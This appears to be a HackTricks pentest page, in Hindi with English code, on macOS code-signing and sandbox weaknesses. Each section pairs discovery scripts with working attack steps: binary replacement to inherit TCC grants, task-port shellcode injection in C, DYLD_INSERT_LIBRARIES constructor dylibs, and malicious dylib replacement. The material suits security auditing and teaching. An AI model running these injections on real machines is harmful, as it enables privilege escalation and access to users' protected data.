# macOS Code Signing कमजोरियाँ & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### बुनियादी जानकारी

**Ad-hoc signing** (`CS_ADHOC`) एक कोड सिग्नेचर बनाता है जिसमें **कोई certificate chain नहीं** — यह कोड का एक hash है जिसमें developer identity की कोई verification नहीं होती। इस binary की उत्पत्ति किसी developer या organization तक ट्रेस नहीं की जा सकती।

Apple Silicon Macs पर, सभी executables के लिए कम से कम एक ad-hoc signature आवश्यक है। इसका मतलब है कि आप कई development tools, Homebrew packages, और third-party utilities पर ad-hoc signatures पाएँगे।

### क्यों यह महत्वपूर्ण है

- **कोई वेरिफ़ायबल पहचान नहीं** — binary को पहचान-आधारित जाँचों द्वारा बिना पता चले बदला जा सकता है
- तीसरे पक्ष के ad-hoc बाइनरी जो **privileged positions** (FDA, daemon, helpers) में हैं, उच्च-प्राथमिकता वाले लक्ष्य होते हैं
- कुछ कॉन्फ़िगरेशन में, ad-hoc signatures की जाँच developer-signed code जितनी **सख्ती से नहीं** की जा सकती
- जिन ad-hoc signed binaries को **TCC grants** प्राप्त हैं वे विशेष रूप से मूल्यवान होते हैं — ये grants तब भी बनी रहती हैं जब binary की सामग्री बदल जाती है (यह इस पर निर्भर करता है कि TCC ने grant को कैसे keyed किया था)

### खोज
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### हमला: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## डिबग करने योग्य प्रक्रियाएँ (get-task-allow)

### बुनियादी जानकारी

**`com.apple.security.get-task-allow`** entitlement (या `CS_GET_TASK_ALLOW` flag) किसी भी प्रक्रिया को एक debugger के रूप में attach होने की अनुमति देता है, जिससे memory पढ़ना, registers संशोधित करना, code इंजेक्ट करना, और execution नियंत्रित करना संभव होता है।

यह केवल development builds के लिए होना चाहिए। हालाँकि, कुछ third-party binaries production में इस entitlement के साथ शिप होते हैं।

> [!CAUTION]
> A production binary with `get-task-allow` is an **instant exploitation primitive**. कोई भी स्थानीय प्रक्रिया `task_for_pid()` को कॉल करके लक्ष्य का Mach task port प्राप्त कर सकती है, और उससे ऐसा arbitrary code इंजेक्ट कर सकती है जो लक्ष्य के entitlements, TCC grants, और security context के साथ चलता है।

### खोज
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### हमला: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## लाइब्रेरी वैलिडेशन नहीं + DYLD Environment

### घातक संयोजन

जब किसी बाइनरी में **दोनों** हों:
- `com.apple.security.cs.disable-library-validation` (किसी भी dylib को लोड करता है)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars को स्वीकार करता है)

यह एक **guaranteed code injection primitive** है — `DYLD_INSERT_LIBRARIES` पूरी तरह से काम करता है।

### खोज
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox अस्थायी अपवाद

### ये Sandbox को कैसे कमजोर करते हैं

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) App Sandbox में छेद कर देते हैं:

| अपवाद | यह क्या अनुमति देता है |
|---|---|
| `temporary-exception.mach-lookup.global-name` | system-wide XPC/Mach services से कनेक्ट करना |
| `temporary-exception.files.absolute-path.read-write` | app container के बाहर फ़ाइलों को पढ़ने/लिखने की अनुमति |
| `temporary-exception.iokit-user-client-class` | IOKit user-client कनेक्शन खोलना |
| `temporary-exception.shared-preference.read-only` | अन्य apps की preferences पढ़ना |
| `temporary-exception.files.home-relative-path.read-write` | `~` के सापेक्ष paths तक पहुँच |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

The most dangerous exception is **mach-lookup** — यह एक sandboxed ऐप को विशेषाधिकार प्राप्त daemons से बात करने की अनुमति देता है:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## निजी Apple एंटाइटलमेंट्स

### ये क्या हैं

`com.apple.private.*` से प्रीफ़िक्स किए गए एंटाइटलमेंट्स उन **Apple-आंतरिक APIs** तक पहुँच प्रदान करते हैं जो तृतीय-पक्ष डेवलपर्स के लिए दस्तावेज़ीकृत या उपलब्ध नहीं हैं। तृतीय-पक्ष बायनरीज़ जिनके पास प्राइवेट एंटाइटलमेंट्स होते हैं, वे इन्हें enterprise cert, MDM, या non-App-Store distribution के माध्यम से प्राप्त करते हैं।

### खतरनाक प्राइवेट एंटाइटलमेंट्स

| एंटाइटलमेंट | क्षमता |
|---|---|
| `com.apple.private.tcc.manager` | पूरा TCC डेटाबेस पढ़ने/लिखने की क्षमता |
| `com.apple.private.tcc.allow` | विशिष्ट TCC सेवाओं तक पहुँच |
| `com.apple.private.security.no-sandbox` | sandbox के बिना चलाना |
| `com.apple.private.iokit` | प्रत्यक्ष IOKit ड्राइवर तक पहुँच |
| `com.apple.private.kernel.*` | Kernel इंटरफ़ेस तक पहुँच |
| `com.apple.private.xpc.launchd.job-label` | launchd jobs को रजिस्टर/प्रबंधित करना |
| `com.apple.rootless.install` | SIP-प्रोटेक्टेड पाथ्स में लिखना |

### खोज
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## कस्टम सैंडबॉक्स प्रोफाइल्स (SBPL)

### वे क्या हैं

बाइनरीज़ SBPL (Seatbelt Profile Language) में लिखे गए **कस्टम सैंडबॉक्स प्रोफाइल्स** के साथ आ सकती हैं। ये प्रोफाइल्स default App Sandbox की तुलना में अधिक प्रतिबंधात्मक या **अधिक अनुमति देने वाली** हो सकती हैं।

### कस्टम प्रोफाइल्स का ऑडिट
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## लिखने योग्य Library Paths

### ये क्या हैं

जब कोई binary किसी path से dynamic library लोड करता है जिसे current user **write to** कर सकता है, तो उस library को malicious code से बदल दिया जा सकता है।

### खोज
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### हमला: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## संदर्भ

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
